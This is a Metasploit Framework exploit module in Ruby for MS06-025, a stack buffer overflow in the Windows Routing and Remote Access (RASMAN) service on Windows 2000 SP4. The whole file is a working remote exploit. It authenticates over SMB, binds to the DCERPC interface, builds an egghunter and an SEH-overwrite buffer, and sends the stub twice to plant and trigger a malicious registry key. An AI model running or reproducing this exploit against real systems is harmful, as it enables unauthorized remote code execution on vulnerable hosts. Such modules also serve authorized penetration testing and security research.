##
# $Id: ms06_025_rasmans_reg.rb 10150 2010-08-25 20:55:37Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Egghunter
	include Msf::Exploit::Remote::DCERPC
	include Msf::Exploit::Remote::SMB

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft RRAS Service RASMAN Registry Overflow',
			'Description'    => %q{
					This module exploits a registry-based stack buffer overflow in the Windows Routing
				and Remote Access Service. Since the service is hosted inside svchost.exe,
				a failed exploit attempt can cause other system services to fail as well.
				A valid username and password is required to exploit this flaw on Windows 2000.
				When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'.
				Exploiting this flaw involves two distinct steps - creating the registry key
				and then triggering an overwrite based on a read of this key. Once the key is
				created, it cannot be recreated. This means that for any given system, you
				only get one chance to exploit this flaw. Picking the wrong target will require
				a manual removal of the following registry key before you can try again:
				HKEY_USERS\\.DEFAULT\\Software\\Microsoft\\RAS Phonebook
			},
			'Author'         => [ 'pusscat', 'hdm' ],
			'License'        => BSD_LICENSE,
			'Version'        => '$Revision: 10150 $',
			'References'     =>
				[
					[ 'CVE', '2006-2370' ],
					[ 'OSVDB', '26437' ],
					[ 'BID', '18325' ],
					[ 'MSB', 'MS06-025' ]
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread'
				},
			'Payload'        =>
				{
					'Space'    => 512,
					'BadChars' => "\x00\x2c\x5c\x2e\x3a\x24",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows 2000 SP4', { 'Ret' => 0x750217ae } ],  # call esi
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jun 13 2006'))

		register_options(
			[
				OptString.new('SMBPIPE', [ true,  "Rawr.", 'router']),
			], self.class)
	end

	# Post authentication bugs are rarely useful during automation
	def autofilter
		false
	end

	def exploit
		connect()
		smb_login()
		print_status("Trying target #{target.name}...")

		# Generate the egghunter payload
		hunter = generate_egghunter(payload.encoded, payload_badchars, { :checksum => true })
		egg    = hunter[1]

		# Pick a "filler" character that we know doesn't get mangled
		# by the wide string conversion routines
		filset = "\xc1\xff\x67\x1b\xd3\xa3\xe7"
		fil    = filset[ rand(filset.length) ].chr

		# Bind to the actual DCERPC interface
		handle = dcerpc_handle('20610036-fa22-11cf-9823-00a0c911e5df', '1.0', 'ncacn_np', ["\\#{datastore['SMBPIPE']}"])
		print_status("Binding to #{handle}")
		dcerpc_bind(handle)
		print_status("Bound to #{handle}")

		# Add giant blocks of guard data before and after the egg
		eggdata  =
			fil * 1024 +
			egg +
			fil * 1024

		# Place the egghunter where ESI happens to point
		bof = (fil * 178)
		bof[84, hunter[0].length] = hunter[0]

		# Overwrite the SEH ptr, even though ESP is smashed
		# The handle after the ret must be an invalid address
		pat =
			(fil * 886) +
			NDR.long(target.ret) +
			(fil * 3) + "\xc0" +
			bof

		type2 =
			NDR.string( (fil * 1024) + "\x00" ) +
			NDR.string( pat + "\x00" ) +
			NDR.string( (fil * 4096) + "\x00" ) +
				NDR.long(rand(0xffffffff)) +
				NDR.long(rand(0xffffffff))

		type1 =
			NDR.long(rand(0xffffffff)) + # OperatorDial
			NDR.long(rand(0xffffffff)) + # PreviewPhoneNumber
			NDR.long(rand(0xffffffff)) + # UseLocation
			NDR.long(rand(0xffffffff)) + # ShowLights
			NDR.long(rand(0xffffffff)) + # ShowConnectStatus
			NDR.long(rand(0xffffffff)) + # CloseOnDial
			NDR.long(rand(0xffffffff)) + # AllowLogonPhonebookEdits
			NDR.long(rand(0xffffffff)) + # AllowLogonLocationEdits
			NDR.long(rand(0xffffffff)) + # SkipConnectComplete
			NDR.long(rand(0xffffffff)) + # NewEntryWizard
			NDR.long(rand(0xffffffff)) + # RedialAttempts
			NDR.long(rand(0xffffffff)) + # RedialSeconds
			NDR.long(rand(0xffffffff)) + # IdleHangUpSeconds
			NDR.long(rand(0xffffffff)) + # RedialOnLinkFailure
			NDR.long(rand(0xffffffff)) + # PopupOnTopWhenRedialing
			NDR.long(rand(0xffffffff)) + # ExpandAutoDialQuery
			NDR.long(rand(0xffffffff)) + # CallbackMode

			NDR.long(0x45) + type2 +     # Parsed by CallbackListFromRpc
			NDR.wstring("\x00" * 129)  +
			NDR.long(rand(0xffffffff)) +
			NDR.wstring("\x00" * 520)  +
			NDR.wstring("\x00" * 520)  +

			NDR.long(rand(0xffffffff)) +
			NDR.long(rand(0xffffffff)) +
			NDR.long(rand(0xffffffff)) +
			NDR.long(rand(0xffffffff)) +
			NDR.long(rand(0xffffffff)) +
			NDR.long(rand(0xffffffff)) +
			NDR.long(rand(0xffffffff)) +
			NDR.long(rand(0xffffffff)) +

			NDR.string("\x00" * 514) +

			NDR.long(rand(0xffffffff)) +
				NDR.long(rand(0xffffffff))

		stubdata =
			type1 +
			NDR.long(rand(0xffffffff)) +
			eggdata

		print_status('Stub is ' + stubdata.length.to_s + ' bytes long.')

		begin
			print_status('Creating the malicious registry key...')
			response = dcerpc.call(0xA, stubdata)

			print_status('Attempting to trigger the base pointer overwrite...')
			response = dcerpc.call(0xA, stubdata)

		rescue Rex::Proto::DCERPC::Exceptions::NoResponse
		end

		handler
		disconnect
	end

end

